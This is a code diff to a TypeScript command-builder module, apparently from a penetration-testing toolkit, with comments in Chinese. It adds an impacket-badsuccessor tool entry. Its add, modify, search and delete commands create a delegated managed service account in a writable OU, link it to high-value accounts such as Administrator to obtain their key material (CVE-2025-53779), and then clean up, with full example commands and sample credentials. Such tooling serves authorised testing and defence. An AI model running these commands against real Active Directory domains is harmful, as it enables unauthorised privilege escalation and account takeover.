@@ -2,13 +2,14 @@ import type { Profile, Tool } from '../../../types';
 import { buildImpacketDomainAuth, domainDN, q, v } from '../../../lib/auth';
 
 /**
- * impacket AD 攻击类工具 (DACL/Owner/RBCD/机器账户/域提权/NTLM 中继)
- * 参数定义来源为本机 impacket v0.14.0.dev0 --help 与官方 examples:
+ * impacket AD 攻击类工具 (DACL/Owner/RBCD/dMSA/机器账户/域提权/NTLM 中继)
+ * 参数定义来源为本机 impacket v0.13.1 --help 与官方 examples:
  * https://github.com/fortra/impacket/tree/master/examples
  *
- * dacledit/owneredit/rbcd/addcomputer 的 identity 位置参数为
+ * dacledit/owneredit/rbcd/addcomputer/badsuccessor 的 identity 位置参数为
  * domain.local/username[:password] (域身份，无 @host)，使用 buildImpacketDomainAuth；
- * 四者均支持 -hashes/-no-pass/-k/-aesKey/-dc-ip (dacledit/owneredit 另有 -dc-host)。
+ * 均支持 -hashes/-no-pass/-k/-aesKey/-dc-ip/-dc-host (addcomputer/badsuccessor 的
+ * -dc-host 通过 buildImpacketDomainAuth 之外的参数显式给出时自行拼接)。
  * raiseChild 仅支持 -hashes/-no-pass/-k/-aesKey (无 -dc-ip)，单独构造。
  * ntlmrelayx 是中继监听端，无认证位置参数，直接用 v() 拼接。
  */
@@ -320,6 +321,71 @@ export const impacketAdAttackTools: Tool[] = [
 -k -no-pass / -aesKey hex key -k: Kerberos 认证
 注意: 该脚本无 -dc-ip/-dc-host 参数，需保证子域 FQDN 可解析`,
         example: `impacket-raiseChild child.corp.local/administrator:'Passw0rd!' -target-exec dc01.corp.local -w admin.ccache`,
+      },
+    ],
+  },
+  {
+    id: 'badsuccessor',
+    name: 'impacket-badsuccessor',
+    category: 'impacket',
+    homepage: 'https://github.com/fortra/impacket/blob/master/examples/badsuccessor.py',
+    description: 'dMSA 利用工具 (BadSuccessor)：在可写 OU 创建委派托管服务账户并链接到高价值账户，直接榨取其凭据 (v0.13 新增)',
+    commands: [
+      {
+        id: 'badsuccessor-add',
+        title: '在可写 OU 创建 dMSA',
+        description: '-action add 在攻击者有 CreateChild 权限的 OU 中创建 dMSA，-principals-allowed 指定可取回托管密码的账户',
+        build: (p) => `impacket-badsuccessor ${buildImpacketDomainAuth(p)} -action add -target-ou ${v('', 'OU=TARGET,DC=DOMAIN,DC=LOCAL')} -dmsa-name ${v('', 'DMSA_NAME')}`,
+        usage: `位置参数 [domain/]username[:password]: 认证 DC 的账户 (需对目标 OU 有创建 dMSA 子对象的权限)
+-action add: 创建 dMSA (必须配合 -target-ou)
+-target-ou OU_DN: 目标 OU 的 DN (如 OU=weakOU,DC=corp,DC=local)，攻击者需对其有写权限
+-dmsa-name NAME: dMSA 名称 (省略时随机生成 dmsa-[A-Z0-9]{8})
+-principals-allowed USER: 允许取回托管密码的账户 (省略时用当前认证用户)
+-dns-hostname HOST: dMSA 的 DNS 主机名 (省略时自动生成 dmsaname.domain)
+-method {LDAP,LDAPS}: 连接方式；-port {389,636}；-baseDN 指定 LDAP 根
+-hashes LMHASH:NTHASH: NTLM 哈希认证；-k -no-pass / -aesKey hex key -k: Kerberos 认证
+-dc-ip / -dc-host: 指定域控 IP 或主机名`,
+        example: `impacket-badsuccessor corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action add -target-ou OU=IT,DC=corp,DC=local -dmsa-name evilDMSA`,
+      },
+      {
+        id: 'badsuccessor-modify',
+        title: '链接 dMSA 到高价值账户 (BadSuccessor)',
+        description: '-action modify 将 dMSA 的 msDS-ManagedAccountPrecededByLink 指向目标账户，dMSA 随即继承其权限并可取回其密钥',
+        build: (p) => `impacket-badsuccessor ${buildImpacketDomainAuth(p)} -action modify -target-ou ${v('', 'OU=TARGET,DC=DOMAIN,DC=LOCAL')} -dmsa-name ${v('', 'DMSA_NAME')} -target-account ${v(p.targetObject, 'TARGET_ACCOUNT')}`,
+        usage: `位置参数 [domain/]username[:password]: 认证 DC 的账户
+-action modify: 修改已有 dMSA (必须配合 -dmsa-name -target-ou -target-account)
+-target-account USER: 被链接的目标用户/计算机账户 (可指向 DC、Domain Admins、
+  Protected Users 成员等高价值账户)，dMSA 的 msDS-ManagedAccountPrecededByLink 将被设为该账户
+-principals-allowed USER: 允许取回托管密码的账户
+说明: BadSuccessor (CVE-2025-53779) 利用 dMSA 迁移逻辑缺陷——对任意可写 OU 有权限的
+普通域用户创建 dMSA 并将其"前任账户"指向高价值账户后，即可通过 dMSA 取回该账户的
+密钥材料 (等价于接管该账户)，全程无需目标账户本身的任何权限
+-hashes / -k -no-pass / -aesKey -k: 认证方式；-dc-ip / -dc-host 指定 DC`,
+        example: `impacket-badsuccessor corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action modify -target-ou OU=IT,DC=corp,DC=local -dmsa-name evilDMSA -target-account Administrator`,
+      },
+      {
+        id: 'badsuccessor-search',
+        title: '查询 dMSA',
+        description: '-action search 查询 dMSA 对象的当前配置 (链接目标/可取密主体)',
+        build: (p) => `impacket-badsuccessor ${buildImpacketDomainAuth(p)} -action search -dmsa-name ${v('', 'DMSA_NAME')}`,
+        usage: `位置参数 [domain/]username[:password]: 认证 DC 的账户
+-action search: 查询 dMSA 对象信息
+-dmsa-name NAME: 要查询的 dMSA 名称
+-target-ou OU_DN: 限定搜索的 OU
+-hashes / -k -no-pass / -aesKey -k: 认证方式；-dc-ip / -dc-host 指定 DC`,
+        example: `impacket-badsuccessor corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action search -dmsa-name evilDMSA`,
+      },
+      {
+        id: 'badsuccessor-delete',
+        title: '删除 dMSA (清理)',
+        description: '-action delete 删除攻击中创建的 dMSA 对象',
+        build: (p) => `impacket-badsuccessor ${buildImpacketDomainAuth(p)} -action delete -target-ou ${v('', 'OU=TARGET,DC=DOMAIN,DC=LOCAL')} -dmsa-name ${v('', 'DMSA_NAME')}`,
+        usage: `位置参数 [domain/]username[:password]: 认证 DC 的账户
+-action delete: 删除 dMSA (必须配合 -dmsa-name -target-ou)
+-dmsa-name NAME: 要删除的 dMSA 名称
+-target-ou OU_DN: dMSA 所在的 OU
+-hashes / -k -no-pass / -aesKey -k: 认证方式；-dc-ip / -dc-host 指定 DC`,
+        example: `impacket-badsuccessor corp.local/lowuser:'Passw0rd!' -dc-ip 10.0.0.10 -action delete -target-ou OU=IT,DC=corp,DC=local -dmsa-name evilDMSA`,
       },
     ],
   },
